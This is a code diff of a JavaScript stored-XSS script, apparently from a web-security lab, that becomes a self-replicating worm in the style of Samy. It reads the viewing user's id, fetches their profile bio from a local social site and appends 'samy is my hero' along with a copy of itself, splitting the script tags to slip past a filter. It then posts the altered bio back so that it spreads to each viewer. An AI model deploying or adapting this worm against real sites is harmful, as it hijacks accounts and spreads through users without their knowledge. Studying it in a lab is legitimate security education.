@@ -1,32 +1,42 @@
 <script>
 
-var viewer_id = document.getElementById("viewer").innerHTML;
-console.log(viewer_id)
-var viewer_bio = "";
+function xss() {
 
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-        resp = xhttp.response
-        var reg = new RegExp('<p id="bio">(?<bio>.*)<\/p>');
-        var match = reg.exec(resp)
-        bio = match.groups.bio
-        console.log(bio);
-    }
-};
-var get_url = "http://127.0.0.1:8000/social/profile/" + viewer_id
-xhttp.open("GET", get_url, true);
-xhttp.send();
+    var viewer_id = document.getElementById("viewer").innerHTML;
 
-var xhr = new XMLHttpRequest();
-var post_url = "http://127.0.0.1:8000/social/profile/" + viewer_id + "/"
-xhr.open("POST", post_url, true);
+    if (!viewer_id) return;
 
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    var url = "http://127.0.0.1:8000/social/profile/" + viewer_id + "/";
 
-var data = "pk=" + viewer_id;
-data += "&name=hacked"
+    $(document).ready(function () {
 
-xhr.send(data);
+        $.get(url, function(data, status) {
+
+            var reg = new RegExp('<p id="bio">(?<bio>.*)<\/p>');
+            match = reg.exec(data);
+            if (!match) return;
+
+            viewer_bio = match.groups.bio;
+
+            if (viewer_bio.includes("<scr" + "ipt")) return;
+
+            script_text = "<scr" + "ipt>" + xss.toString() + ";xss();" + "</scr" + "ipt>";
+            bio = viewer_bio + " but most of all, samy is my hero" + script_text;
+            
+            var payload = {
+                "pk": viewer_id,
+                "bio": bio
+            };
+
+            $.post(url, payload, function(data, status) {
+            console.log("WORKED!");
+            });
+        });
+
+    });
+
+}
+
+xss();
 
 </script>
